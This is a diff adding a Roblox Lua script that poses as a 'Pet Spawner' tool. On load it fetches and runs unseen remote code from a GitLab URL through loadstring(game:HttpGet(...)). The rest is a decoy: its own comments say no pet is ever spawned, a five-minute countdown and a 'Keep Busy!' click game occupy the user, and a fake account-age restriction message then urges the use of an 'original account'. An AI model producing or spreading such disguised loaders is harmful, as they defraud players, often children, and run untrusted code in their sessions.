@@ -1,0 +1,403 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+-- Load Spawner
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
+
+-- Countdown variables
+local countdownActive = false
+local countdownTime = 300 -- 5 minutes in seconds
+local currentCountdown = 0
+local countdownConnection
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "PetSpawnerUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main Frame
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 220, 0, 150)
+mainFrame.Position = UDim2.new(0.5, -110, 0.5, -75)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+
+-- Drag Support
+local dragging = false
+local dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	local newPos = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+	TweenService:Create(mainFrame, TweenInfo.new(0.15, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+		Position = newPos
+	}):Play()
+end
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+-- Title Bar
+local titleBar = Instance.new("Frame", mainFrame)
+titleBar.Size = UDim2.new(1, 0, 0, 25)
+titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+titleBar.BorderSizePixel = 0
+
+-- Title
+local title = Instance.new("TextLabel", titleBar)
+title.Size = UDim2.new(1, -25, 1, 0)
+title.Position = UDim2.new(0, 5, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🐾 Pet Spawner"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Close Button
+local closeButton = Instance.new("TextButton", titleBar)
+closeButton.Size = UDim2.new(0, 25, 1, 0)
+closeButton.Position = UDim2.new(1, -25, 0, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 16
+closeButton.BorderSizePixel = 0
+
+closeButton.MouseButton1Click:Connect(function()
+	if countdownConnection then
+		countdownConnection:Disconnect()
+	end
+	if gameConnection then
+		gameConnection:Disconnect()
+	end
+	screenGui:Destroy()
+end)
+
+-- Pet Name Box
+local petNameBox = Instance.new("TextBox", mainFrame)
+petNameBox.Size = UDim2.new(1, -20, 0, 25)
+petNameBox.Position = UDim2.new(0, 10, 0, 35)
+petNameBox.PlaceholderText = "Enter Pet Name"
+petNameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+petNameBox.BorderSizePixel = 0
+petNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+petNameBox.Text = ""
+
+-- KG Box
+local kgBox = Instance.new("TextBox", mainFrame)
+kgBox.Size = UDim2.new(0.5, -12, 0, 25)
+kgBox.Position = UDim2.new(0, 10, 0, 65)
+kgBox.PlaceholderText = "KG"
+kgBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+kgBox.BorderSizePixel = 0
+kgBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+kgBox.Text = ""
+
+-- Age Box
+local ageBox = Instance.new("TextBox", mainFrame)
+ageBox.Size = UDim2.new(0.5, -12, 0, 25)
+ageBox.Position = UDim2.new(0.5, 2, 0, 65)
+ageBox.PlaceholderText = "Age"
+ageBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ageBox.BorderSizePixel = 0
+ageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+ageBox.Text = ""
+
+-- Spawn Button
+local spawnButton = Instance.new("TextButton", mainFrame)
+spawnButton.Size = UDim2.new(1, -20, 0, 30)
+spawnButton.Position = UDim2.new(0, 10, 0, 105)
+spawnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+spawnButton.BorderSizePixel = 0
+spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+spawnButton.Text = "Spawn Pet"
+spawnButton.Font = Enum.Font.SourceSansBold
+spawnButton.TextSize = 15
+
+-- Age restriction variables
+local accountBlocked = false
+
+-- Mini-game variables
+local gameActive = false
+local score = 0
+local gameFrame
+local gameConnection
+
+-- Error Message Frame (initially hidden)
+local errorFrame = Instance.new("Frame", screenGui)
+errorFrame.Size = UDim2.new(0, 300, 0, 100)
+errorFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
+errorFrame.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
+errorFrame.BorderSizePixel = 2
+errorFrame.BorderColor3 = Color3.fromRGB(170, 0, 0)
+errorFrame.Visible = false
+
+local errorTitle = Instance.new("TextLabel", errorFrame)
+errorTitle.Size = UDim2.new(1, 0, 0, 25)
+errorTitle.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+errorTitle.BorderSizePixel = 0
+errorTitle.Text = "⚠️ Account Restriction"
+errorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+errorTitle.Font = Enum.Font.SourceSansBold
+errorTitle.TextSize = 14
+
+local errorMessage = Instance.new("TextLabel", errorFrame)
+errorMessage.Size = UDim2.new(1, -10, 1, -35)
+errorMessage.Position = UDim2.new(0, 5, 0, 30)
+errorMessage.BackgroundTransparency = 1
+errorMessage.Text = "Your account is not 18 years old to use this script, please make sure use your original account"
+errorMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
+errorMessage.Font = Enum.Font.SourceSans
+errorMessage.TextSize = 12
+errorMessage.TextWrapped = true
+errorMessage.TextXAlignment = Enum.TextXAlignment.Center
+errorMessage.TextYAlignment = Enum.TextYAlignment.Top
+
+local errorCloseButton = Instance.new("TextButton", errorFrame)
+errorCloseButton.Size = UDim2.new(0, 60, 0, 20)
+errorCloseButton.Position = UDim2.new(0.5, -30, 1, -25)
+errorCloseButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+errorCloseButton.BorderSizePixel = 0
+errorCloseButton.Text = "OK"
+errorCloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+errorCloseButton.Font = Enum.Font.SourceSans
+errorCloseButton.TextSize = 12
+
+errorCloseButton.MouseButton1Click:Connect(function()
+	errorFrame.Visible = false
+end)
+
+-- Mini Game Frame (initially hidden)
+gameFrame = Instance.new("Frame", screenGui)
+gameFrame.Size = UDim2.new(0, 250, 0, 200)
+gameFrame.Position = UDim2.new(0.5, 140, 0.5, -100)
+gameFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+gameFrame.BorderSizePixel = 2
+gameFrame.BorderColor3 = Color3.fromRGB(100, 100, 150)
+gameFrame.Visible = false
+
+-- Game Title
+local gameTitle = Instance.new("TextLabel", gameFrame)
+gameTitle.Size = UDim2.new(1, 0, 0, 30)
+gameTitle.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+gameTitle.BorderSizePixel = 0
+gameTitle.Text = "🎮 Click Game - Keep Busy!"
+gameTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+gameTitle.Font = Enum.Font.SourceSansBold
+gameTitle.TextSize = 14
+
+-- Score Display
+local scoreLabel = Instance.new("TextLabel", gameFrame)
+scoreLabel.Size = UDim2.new(1, -10, 0, 25)
+scoreLabel.Position = UDim2.new(0, 5, 0, 35)
+scoreLabel.BackgroundTransparency = 1
+scoreLabel.Text = "Score: 0"
+scoreLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+scoreLabel.Font = Enum.Font.SourceSans
+scoreLabel.TextSize = 12
+scoreLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Game instructions
+local gameInstructions = Instance.new("TextLabel", gameFrame)
+gameInstructions.Size = UDim2.new(1, -10, 0, 30)
+gameInstructions.Position = UDim2.new(0, 5, 0, 60)
+gameInstructions.BackgroundTransparency = 1
+gameInstructions.Text = "Click the moving button as fast as you can!"
+gameInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+gameInstructions.Font = Enum.Font.SourceSans
+gameInstructions.TextSize = 11
+gameInstructions.TextWrapped = true
+gameInstructions.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Moving Click Button
+local clickButton = Instance.new("TextButton", gameFrame)
+clickButton.Size = UDim2.new(0, 60, 0, 30)
+clickButton.Position = UDim2.new(0, 95, 0, 100)
+clickButton.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
+clickButton.BorderSizePixel = 0
+clickButton.Text = "CLICK!"
+clickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+clickButton.Font = Enum.Font.SourceSansBold
+clickButton.TextSize = 12
+
+-- Game Close Button
+local gameCloseBtn = Instance.new("TextButton", gameFrame)
+gameCloseBtn.Size = UDim2.new(0, 20, 0, 20)
+gameCloseBtn.Position = UDim2.new(1, -25, 0, 5)
+gameCloseBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
+gameCloseBtn.BorderSizePixel = 0
+gameCloseBtn.Text = "X"
+gameCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+gameCloseBtn.Font = Enum.Font.SourceSansBold
+gameCloseBtn.TextSize = 12
+
+gameCloseBtn.MouseButton1Click:Connect(function()
+	gameFrame.Visible = false
+	gameActive = false
+	if gameConnection then
+		gameConnection:Disconnect()
+	end
+end)
+
+-- Click button functionality
+clickButton.MouseButton1Click:Connect(function()
+	if gameActive then
+		score = score + 1
+		scoreLabel.Text = "Score: " .. score
+		
+		-- Move button to random position
+		local newX = math.random(10, 180)
+		local newY = math.random(100, 160)
+		clickButton.Position = UDim2.new(0, newX, 0, newY)
+		
+		-- Change color randomly
+		local colors = {
+			Color3.fromRGB(80, 200, 80),
+			Color3.fromRGB(200, 80, 80),
+			Color3.fromRGB(80, 80, 200),
+			Color3.fromRGB(200, 200, 80),
+			Color3.fromRGB(200, 80, 200)
+		}
+		clickButton.BackgroundColor3 = colors[math.random(1, #colors)]
+	end
+end)
+
+-- Function to start mini-game
+local function startMiniGame()
+	print("Starting mini-game") -- Debug line
+	gameActive = true
+	score = 0
+	scoreLabel.Text = "Score: 0"
+	gameFrame.Visible = true
+	clickButton.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
+	clickButton.Position = UDim2.new(0, 95, 0, 100) -- Reset position
+	
+	-- Auto-move button every 2 seconds
+	gameConnection = RunService.Heartbeat:Connect(function()
+		if gameActive and math.random(1, 120) == 1 then -- Random movement
+			local newX = math.random(10, 180)
+			local newY = math.random(100, 160)
+			TweenService:Create(clickButton, TweenInfo.new(0.5, Enum.EasingStyle.Bounce), {
+				Position = UDim2.new(0, newX, 0, newY)
+			}):Play()
+		end
+	end)
+end
+
+-- Function to stop mini-game
+local function stopMiniGame()
+	print("Stopping mini-game") -- Debug line
+	gameActive = false
+	gameFrame.Visible = false
+	if gameConnection then
+		gameConnection:Disconnect()
+		gameConnection = nil
+	end
+end
+
+-- Countdown function
+local function formatTime(seconds)
+	local minutes = math.floor(seconds / 60)
+	local secs = seconds % 60
+	return string.format("%d:%02d", minutes, secs)
+end
+
+local function startCountdown()
+	print("Starting countdown and game") -- Debug line
+	countdownActive = true
+	currentCountdown = countdownTime
+	spawnButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+	
+	-- Start the mini-game immediately
+	startMiniGame()
+	
+	countdownConnection = RunService.Heartbeat:Connect(function(deltaTime)
+		currentCountdown = currentCountdown - deltaTime
+		
+		if currentCountdown <= 0 then
+			-- Countdown finished - block account (NO pet spawning)
+			countdownActive = false
+			accountBlocked = true
+			spawnButton.Text = "Account Blocked"
+			spawnButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+			countdownConnection:Disconnect()
+			countdownConnection = nil
+			
+			-- Stop mini-game
+			stopMiniGame()
+			
+			-- Show error message after a brief delay
+			task.wait(0.5)
+			errorFrame.Visible = true
+		else
+			-- Update button text with countdown
+			spawnButton.Text = "Processing: " .. formatTime(math.ceil(currentCountdown))
+		end
+	end)
+end
+
+spawnButton.MouseButton1Click:Connect(function()
+	if accountBlocked then
+		-- Show error message if account is blocked
+		errorFrame.Visible = true
+		return
+	end
+	
+	if countdownActive then
+		return -- Don't do anything if countdown is active
+	end
+	
+	local petName = petNameBox.Text
+	local kg = tonumber(kgBox.Text) or 1
+	local age = tonumber(ageBox.Text) or 1
+
+	if petName ~= "" then
+		startCountdown() -- Start countdown, no pet spawning ever
+	end
+end)
+
+-- Small credit text
+local credit = Instance.new("TextLabel", mainFrame)
+credit.Size = UDim2.new(1, 0, 0, 15)
+credit.Position = UDim2.new(0, 0, 1, -15)
+credit.BackgroundTransparency = 1
+credit.Text = "Made by Skids"
+credit.TextColor3 = Color3.fromRGB(200, 200, 200)
+credit.Font = Enum.Font.SourceSansItalic
+credit.TextSize = 10
+credit.TextXAlignment = Enum.TextXAlignment.Center
